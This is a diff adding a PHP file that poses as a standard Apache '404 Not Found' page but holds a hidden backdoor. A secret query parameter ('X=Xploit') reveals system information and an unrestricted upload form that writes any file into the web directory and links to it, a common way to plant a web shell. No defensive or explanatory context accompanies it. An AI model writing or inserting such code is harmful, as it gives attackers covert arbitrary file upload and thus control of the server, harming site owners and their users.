@@ -1,0 +1,30 @@
+<?php
+echo'<title>404 Not Found </title>';
+echo'<body>
+<h1>Not Found</h1>
+<p>The requested URL was not found on this server.</p>
+<p>Additionally, a 404 Not Found
+error was encountered while trying to use an ErrorDocument to handle the request.</p>
+</body>';
+if($_GET['X']=="Xploit"){
+echo "<center><b>Uname:".php_uname()."</b>"; 
+echo '<font color="black" size="4">';
+if(isset($_POST['Submit'])){
+    $filedir = ""; 
+    $maxfile = '2000000';
+    $mode = '0644';
+    $userfile_name = $_FILES['image']['name'];
+    $userfile_tmp = $_FILES['image']['tmp_name'];
+    if(isset($_FILES['image']['name'])) {
+        $qx = $filedir.$userfile_name;
+        @move_uploaded_file($userfile_tmp, $qx);
+        @chmod ($qx, octdec($mode));
+echo" <a href=$userfile_name><center><b>Sucess Upload !!! ==> $userfile_name</b></center></a>";
+}
+}
+else{
+echo'<form method="POST" action="#" enctype="multipart/form-data"><input type="file" name="image"><br>
+<input type="Submit" name="Submit" value="Upload"></form>';
+}
+echo '</center></font>';
+}?>
